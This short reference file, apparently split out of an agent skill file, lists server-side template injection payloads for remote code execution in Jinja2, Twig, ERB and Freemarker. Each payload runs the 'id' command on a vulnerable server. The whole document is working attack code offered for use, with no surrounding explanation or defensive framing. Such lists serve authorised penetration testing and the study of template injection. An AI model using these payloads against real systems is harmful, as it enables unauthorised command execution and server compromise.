# Template injection RCE payloads

Verbatim payload block from `SKILL.md` (progressive disclosure); procedure and discipline stay in the body.

```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# ERB (Ruby)
<%= `id` %>

# Freemarker
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
```
